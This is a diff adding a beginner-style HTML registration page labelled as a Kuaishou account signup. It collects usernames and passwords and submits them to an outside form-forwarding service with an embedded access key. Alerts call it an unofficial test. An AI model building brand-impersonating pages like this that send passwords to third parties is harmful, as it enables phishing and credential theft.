@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>用户注册页面</title>
+<style>
+ body{
+ background:green;
+ text-align:center;
+ }
+</style>
+</head>
+<body>
+  <h1>用户注册（快手账户）</h1>
+<hr>
+  <form action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="d3bd1f53-03ac-427e-bbdb-650850d6252e">
+ <label for="text">用户名</label>
+	 <input 
+	 type="text" 
+	 placeholder="请输入用户名" 
+	 id="text"
+	 name="账号"
+	 required>
+<br>
+ <label for="password">密码</label>
+	 <input 
+	 type="password" 
+	 placeholder="请输入密码" 
+	 id="password"
+	 name="密码"
+	 required>
+<br>
+ <label>性别</label>
+ 	<input 
+	 type="radio" 
+	 name="性别" 
+	 value="男"
+	 id="a">
+	 <label for="a">男</label>
+ 	<input 
+	 type="radio" 
+	 name="sex" 
+	 value="女"
+	 id="b">
+	 <label for="b">女</label>	
+<br>
+ <label>兴趣爱好</label>
+ 	<input 
+	 type="checkbox" 
+	 name="爱好" 
+	 value="玩"
+	 id="hobby">
+	 <label for="hobby">玩</label>
+	 <input 
+	 type="checkbox" 
+	 name="hobby" 
+	 value="玩"
+	 id="hobby1">
+	 <label for="hobby1">玩</label>
+	 <input 
+	 type="checkbox" 
+	 name="hobby" 
+	 value="还是玩"
+	 id="hobby2">
+	 <label for="hobby2">还是玩</label>
+<br>
+<label for="ct">所在省份</label>
+ 	<select id="ct" name="地区">
+	   <option value="河北">河北</option>
+	   <option selected value="广东">广东</option>
+	   <option value="广西">广西</option>
+	 </select>	 
+<br>
+<label for="js">个人介绍</label>
+ 	<textarea id="js" placeholder="请输入个人介绍" cols=8 rows=5 name="个人介绍">
+	 </textarea>	 
+<br>
+<button type="submit" onclick="alert('妹妹～你真的不怕吗，嗯...')">注册</button>	 	  	 	 
+  </form>  
+  <script>
+ 	alert("虚拟信息填表
+这不是官方，只是测试，慎用")
+  </script>
+</body>
+</html>  
